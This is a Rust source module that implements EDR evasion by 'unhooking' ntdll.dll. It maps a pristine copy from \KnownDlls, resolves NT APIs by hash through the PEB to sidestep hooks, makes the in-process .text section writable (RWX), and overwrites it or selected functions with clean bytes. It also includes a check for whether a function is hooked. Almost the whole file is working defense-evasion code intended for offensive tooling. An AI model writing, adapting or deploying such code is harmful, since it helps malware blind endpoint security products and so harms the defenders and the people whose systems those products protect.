//! API Unhooking — Restore Clean NTDLL from KnownDlls
//!
//! EDR products commonly hook userland APIs by patching the `.text` section of
//! `ntdll.dll` in the target process. This module provides a mechanism to
//! restore the original, unhooked code by mapping a fresh copy of `ntdll.dll`
//! from the `\KnownDlls` object directory (which contains the pristine system
//! images) and copying the `.text` section over the potentially hooked version.
//!
//! ## Technique: Perun's Fart / KnownDlls Reload
//!
//! 1. Open `\KnownDlls\ntdll.dll` section object
//! 2. Map it into our address space (read-only, clean copy)
//! 3. Locate the `.text` section in both the clean and potentially hooked copies
//! 4. Temporarily make our `.text` writable (VirtualProtect)
//! 5. Copy clean `.text` bytes over our potentially hooked `.text`
//! 6. Restore original protection
//!
//! This neutralizes inline hooks, trampolines, and IAT patches for NTAPIs.
//!
//! ## Platform Support
//!
//! - Windows x64: Full implementation using native NT APIs via PEB resolution
//! - Linux / other: Stub (not applicable)

use crate::peb_resolve::{djb2_hash, fn_hashes, PebResolver};

/// Errors from the unhooking subsystem.
#[derive(Debug, Clone, serde::Serialize)]
pub enum UnhookError {
    /// Running on a non-Windows platform; unhooking is not applicable.
    NotSupported,
    /// Failed to locate ntdll.dll via PEB.
    NtdllNotFound,
    /// Failed to open \KnownDlls\ntdll.dll section.
    KnownDllsSectionNotFound,
    /// Failed to map the KnownDlls section.
    MapViewFailed,
    /// Failed to locate .text section in ntdll.
    TextSectionNotFound,
    /// Failed to locate the requested export symbol.
    ExportNotFound { fn_name_hash: u32 },
    /// Failed to change memory protection (VirtualProtect).
    VirtualProtectFailed,
    /// Clean and hooked .text section sizes don't match.
    SizeMismatch,
    /// The NTSTATUS returned by a syscall indicates failure.
    NtStatusFailed { ntstatus: u32 },
}

/// Result of an unhooking operation.
pub type UnhookResult<T> = Result<T, UnhookError>;

/// API Unhooking engine.
///
/// Restores clean NTAPI entry points by overwriting the potentially hooked
/// `.text` section of the in-process `ntdll.dll` with a pristine copy from
/// `\KnownDlls\ntdll.dll`.
pub struct ApiUnhooker {
    resolver: PebResolver,
    /// Base address of our process's ntdll.dll (potentially hooked)
    our_ntdll_base: usize,
    /// Base address of the clean ntdll.dll mapped from KnownDlls
    clean_ntdll_base: usize,
    /// Size of the .text section
    text_section_size: usize,
    /// Offset of .text section from module base
    text_section_offset: usize,
}

impl ApiUnhooker {
    /// DJB2 hash of `ntdll.dll` (lowercase)
    const NTDLL_HASH: u32 = djb2_hash(b"ntdll.dll");

    /// Create a new unhooker instance.
    ///
    /// This locates our process's `ntdll.dll` via PEB, maps a clean copy from
    /// `\KnownDlls\ntdll.dll`, and prepares for the unhook operation.
    pub fn new() -> UnhookResult<Self> {
        #[cfg(target_os = "windows")]
        {
            // Step 1: Locate our ntdll.dll via PEB
            let resolver = PebResolver::new();
            let our_ntdll_base = resolver
                .get_module_base(Self::NTDLL_HASH)
                .ok_or(UnhookError::NtdllNotFound)?;

            // Step 2: Map clean ntdll.dll from \KnownDlls
            let (clean_ntdll_base, text_section_offset, text_section_size) =
                Self::map_clean_ntdll(&resolver)?;

            Ok(Self {
                resolver,
                our_ntdll_base,
                clean_ntdll_base,
                text_section_size,
                text_section_offset,
            })
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err(UnhookError::NotSupported)
        }
    }

    /// Map a clean copy of ntdll.dll from \KnownDlls and locate its .text section.
    #[cfg(target_os = "windows")]
    fn map_clean_ntdll(resolver: &PebResolver) -> UnhookResult<(usize, usize, usize)> {
        use std::mem::zeroed;

        // Resolve required NTAPIs via PEB (bypassing any hooks)
        let nt_open_section = resolver
            .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_OPEN_SECTION)
            .ok_or(UnhookError::NtdllNotFound)?;
        let nt_map_view_of_section = resolver
            .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_MAP_VIEW_OF_SECTION)
            .ok_or(UnhookError::NtdllNotFound)?;
        let _nt_unmap_view_of_section = resolver
            .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_UNMAP_VIEW_OF_SECTION)
            .ok_or(UnhookError::NtdllNotFound)?;
        let nt_close = resolver
            .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_CLOSE)
            .ok_or(UnhookError::NtdllNotFound)?;

        // Build OBJECT_ATTRIBUTES for \KnownDlls\ntdll.dll
        // We need to construct a UNICODE_STRING for the name
        let known_dlls_name: [u16; 21] = [
            0x005C, // '\'
            0x004B, // 'K'
            0x006E, // 'n'
            0x006F, // 'o'
            0x0077, // 'w'
            0x006E, // 'n'
            0x0044, // 'D'
            0x006C, // 'l'
            0x006C, // 'l'
            0x0073, // 's'
            0x005C, // '\'
            0x006E, // 'n'
            0x0074, // 't'
            0x0064, // 'd'
            0x006C, // 'l'
            0x006C, // 'l'
            0x002E, // '.'
            0x0064, // 'd'
            0x006C, // 'l'
            0x006C, // 'l'
            0x0000, // null terminator
        ];

        // OBJECT_ATTRIBUTES structure
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: usize,
            object_name: *const UnicodeString,
            attributes: u32,
            security_descriptor: usize,
            security_quality_of_service: usize,
        }

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *const u16,
        }

        let unicode_name = UnicodeString {
            length: 40, // 20 chars * 2 bytes
            maximum_length: 42,
            buffer: known_dlls_name.as_ptr(),
        };

        let obj_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name: &unicode_name,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: 0,
            security_quality_of_service: 0,
        };

        // Call NtOpenSection
        let mut section_handle: usize = 0;
        let status = unsafe {
            let fn_ptr: unsafe extern "system" fn(*mut usize, u32, *const ObjectAttributes) -> i32 =
                std::mem::transmute(nt_open_section.0);
            fn_ptr(
                &mut section_handle,
                0x000F001F, // SECTION_ALL_ACCESS
                &obj_attr,
            )
        };

        if status < 0 {
            return Err(UnhookError::KnownDllsSectionNotFound);
        }

        // Map the section
        let mut base_address: usize = 0;
        let mut view_size: usize = 0;
        let status = unsafe {
            let fn_ptr: unsafe extern "system" fn(
                usize,      // SectionHandle
                usize,      // ProcessHandle (NtCurrentProcess = -1)
                *mut usize, // BaseAddress
                usize,      // ZeroBits
                usize,      // CommitSize
                *mut usize, // SectionOffset
                *mut usize, // ViewSize
                u32,        // InheritDisposition
                u32,        // AllocationType
                u32,        // Win32Protect
            ) -> i32 = std::mem::transmute(nt_map_view_of_section.0);
            fn_ptr(
                section_handle,
                usize::MAX, // NtCurrentProcess
                &mut base_address,
                0,
                0,
                std::ptr::null_mut(),
                &mut view_size,
                1, // ViewShare
                0,
                0x02, // PAGE_READONLY
            )
        };

        // Close section handle
        unsafe {
            let fn_ptr: unsafe extern "system" fn(usize) -> i32 = std::mem::transmute(nt_close.0);
            fn_ptr(section_handle);
        }

        if status < 0 {
            return Err(UnhookError::MapViewFailed);
        }

        // Locate .text section in the clean copy
        let (text_offset, text_size) =
            Self::find_text_section(base_address).ok_or(UnhookError::TextSectionNotFound)?;

        Ok((base_address, text_offset, text_size))
    }

    /// Find the .text section in a PE module.
    fn find_text_section(module_base: usize) -> Option<(usize, usize)> {
        unsafe {
            // MZ/PE header navigation
            let e_lfanew = *(module_base.wrapping_add(0x3C) as *const u32) as usize;
            let pe_header = module_base.wrapping_add(e_lfanew);

            // Check PE signature
            let sig = *(pe_header as *const u32);
            if sig != 0x00004550 {
                return None; // Not a valid PE
            }

            // IMAGE_FILE_HEADER (20 bytes)
            let opt_hdr = pe_header.wrapping_add(24);

            // IMAGE_OPTIONAL_HEADER64
            // DataDirectory[0] = Export, [1] = Import, etc.
            // Section headers follow optional header
            let num_sections = *(pe_header.wrapping_add(0x6) as *const u16) as usize;
            let opt_hdr_size = *(pe_header.wrapping_add(0x14) as *const u16) as usize;
            let section_header = opt_hdr.wrapping_add(opt_hdr_size);

            // IMAGE_SECTION_HEADER is 40 bytes
            for i in 0..num_sections {
                let sh = section_header.wrapping_add(i * 40);
                let name_ptr = sh as *const u8;
                let mut name = [0u8; 8];
                for j in 0..8 {
                    name[j] = *name_ptr.wrapping_add(j);
                }

                // Check for ".text" section
                if &name == b".text\x00\x00\x00" || &name[..5] == b".text" {
                    let virtual_size = *(sh.wrapping_add(8) as *const u32) as usize;
                    let virtual_address = *(sh.wrapping_add(12) as *const u32) as usize;
                    let raw_size = *(sh.wrapping_add(16) as *const u32) as usize;

                    let size = virtual_size.max(raw_size);
                    return Some((virtual_address, size));
                }
            }
        }
        None
    }

    /// Perform the unhook: copy clean .text over our potentially hooked .text.
    ///
    /// This is the core operation that neutralizes userland API hooks.
    pub fn unhook(&self) -> UnhookResult<()> {
        #[cfg(target_os = "windows")]
        {
            // Resolve NtProtectVirtualMemory via PEB (bypassing hooks)
            let nt_protect_vm = self
                .resolver
                .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_PROTECT_VIRTUAL_MEMORY)
                .ok_or(UnhookError::NtdllNotFound)?;

            let mut our_text = self.our_ntdll_base + self.text_section_offset;
            let clean_text = self.clean_ntdll_base + self.text_section_offset;

            // Verify sizes match
            if self.text_section_size == 0 {
                return Err(UnhookError::SizeMismatch);
            }

            // Change protection to RWX
            let mut old_protect: u32 = 0;
            let mut region_size = self.text_section_size;
            let status = unsafe {
                let fn_ptr: unsafe extern "system" fn(
                    usize,      // ProcessHandle
                    *mut usize, // BaseAddress
                    *mut usize, // RegionSize
                    u32,        // NewProtect
                    *mut u32,   // OldProtect
                ) -> i32 = std::mem::transmute(nt_protect_vm.0);
                fn_ptr(
                    usize::MAX, // NtCurrentProcess
                    &mut our_text,
                    &mut region_size,
                    0x40, // PAGE_EXECUTE_READWRITE
                    &mut old_protect,
                )
            };

            if status < 0 {
                return Err(UnhookError::VirtualProtectFailed);
            }

            // Copy clean .text over our .text
            unsafe {
                std::ptr::copy_nonoverlapping(
                    clean_text as *const u8,
                    our_text as *mut u8,
                    self.text_section_size,
                );
            }

            // Restore original protection
            let mut dummy: u32 = 0;
            unsafe {
                let fn_ptr: unsafe extern "system" fn(
                    usize,
                    *mut usize,
                    *mut usize,
                    u32,
                    *mut u32,
                ) -> i32 = std::mem::transmute(nt_protect_vm.0);
                fn_ptr(
                    usize::MAX,
                    &mut our_text,
                    &mut region_size,
                    old_protect,
                    &mut dummy,
                )
            };

            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err(UnhookError::NotSupported)
        }
    }

    /// Unhook specific NTAPI functions by name.
    ///
    /// Instead of unhooking the entire .text section, this surgically restores
    /// only the specified functions. Useful when you want to minimize the
    /// memory footprint of the operation.
    pub fn unhook_functions(&self, fn_hashes: &[u32]) -> UnhookResult<()> {
        #[cfg(target_os = "windows")]
        {
            for &fn_hash in fn_hashes {
                // Find the function in clean ntdll
                let clean_fn = self
                    .resolver
                    .resolve_export(self.clean_ntdll_base as *const u8, fn_hash)
                    .ok_or(UnhookError::ExportNotFound {
                        fn_name_hash: fn_hash,
                    })?;

                // Find the function in our ntdll
                let mut our_fn = self
                    .resolver
                    .resolve_export(self.our_ntdll_base as *const u8, fn_hash)
                    .ok_or(UnhookError::ExportNotFound {
                        fn_name_hash: fn_hash,
                    })?;

                // Calculate offset from module base
                let offset = clean_fn.0 - self.clean_ntdll_base;

                // Verify it's within .text section
                if offset < self.text_section_offset
                    || offset >= self.text_section_offset + self.text_section_size
                {
                    continue; // Skip if not in .text
                }

                // Get the function size (approximate: read until ret or next function)
                let fn_size = Self::estimate_function_size(clean_fn.0)?;

                // Protect and copy
                let nt_protect_vm = self
                    .resolver
                    .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_PROTECT_VIRTUAL_MEMORY)
                    .ok_or(UnhookError::NtdllNotFound)?;

                let mut old_protect: u32 = 0;
                let mut region_size = fn_size;
                let status = unsafe {
                    let fn_ptr: unsafe extern "system" fn(
                        usize,
                        *mut usize,
                        *mut usize,
                        u32,
                        *mut u32,
                    ) -> i32 = std::mem::transmute(nt_protect_vm.0);
                    fn_ptr(
                        usize::MAX,
                        &mut our_fn.0,
                        &mut region_size,
                        0x40, // PAGE_EXECUTE_READWRITE
                        &mut old_protect,
                    )
                };

                if status < 0 {
                    return Err(UnhookError::VirtualProtectFailed);
                }

                unsafe {
                    std::ptr::copy_nonoverlapping(
                        clean_fn.0 as *const u8,
                        our_fn.0 as *mut u8,
                        fn_size,
                    );
                }

                // Restore protection
                let mut dummy: u32 = 0;
                unsafe {
                    let fn_ptr: unsafe extern "system" fn(
                        usize,
                        *mut usize,
                        *mut usize,
                        u32,
                        *mut u32,
                    ) -> i32 = std::mem::transmute(nt_protect_vm.0);
                    fn_ptr(
                        usize::MAX,
                        &mut our_fn.0,
                        &mut region_size,
                        old_protect,
                        &mut dummy,
                    )
                };
            }
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = fn_hashes;
            Err(UnhookError::NotSupported)
        }
    }

    /// Estimate function size by scanning for RET (0xC3) or next function prologue.
    fn estimate_function_size(fn_addr: usize) -> UnhookResult<usize> {
        unsafe {
            let ptr = fn_addr as *const u8;
            let max_scan = 512; // Reasonable upper bound for NTAPI stubs
            for i in 0..max_scan {
                let byte = *ptr.wrapping_add(i);
                // RET instruction
                if byte == 0xC3 {
                    return Ok(i + 1);
                }
                // Next function prologue: 4C 8B D1 (mov r10, rcx)
                if i + 2 < max_scan {
                    if *ptr.wrapping_add(i) == 0x4C
                        && *ptr.wrapping_add(i + 1) == 0x8B
                        && *ptr.wrapping_add(i + 2) == 0xD1
                    {
                        return Ok(i);
                    }
                }
            }
            Ok(max_scan)
        }
    }

    /// Check if a specific function appears to be hooked.
    ///
    /// Compares the first few bytes of our ntdll function with the clean copy.
    pub fn is_hooked(&self, fn_hash: u32) -> UnhookResult<bool> {
        #[cfg(target_os = "windows")]
        {
            let clean_fn = self
                .resolver
                .resolve_export(self.clean_ntdll_base as *const u8, fn_hash)
                .ok_or(UnhookError::ExportNotFound {
                    fn_name_hash: fn_hash,
                })?;

            let our_fn = self
                .resolver
                .resolve_export(self.our_ntdll_base as *const u8, fn_hash)
                .ok_or(UnhookError::ExportNotFound {
                    fn_name_hash: fn_hash,
                })?;

            // Compare first 8 bytes (enough to detect JMP/trampoline)
            let clean_bytes = unsafe { std::slice::from_raw_parts(clean_fn.0 as *const u8, 8) };
            let our_bytes = unsafe { std::slice::from_raw_parts(our_fn.0 as *const u8, 8) };

            Ok(clean_bytes != our_bytes)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = fn_hash;
            Err(UnhookError::NotSupported)
        }
    }
}

impl Default for ApiUnhooker {
    fn default() -> Self {
        Self::new().expect("Failed to create ApiUnhooker")
    }
}

// Add missing fn_hashes for NtProtectVirtualMemory and NtClose
// These need to be added to fn_hashes module in peb_resolve.rs

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_unhooker_returns_not_supported_on_linux() {
        let result = ApiUnhooker::new();
        assert!(matches!(result, Err(UnhookError::NotSupported)));
    }

    #[test]
    fn test_find_text_section_logic() {
        // This test would require a real PE module; skipped in unit tests
    }
}
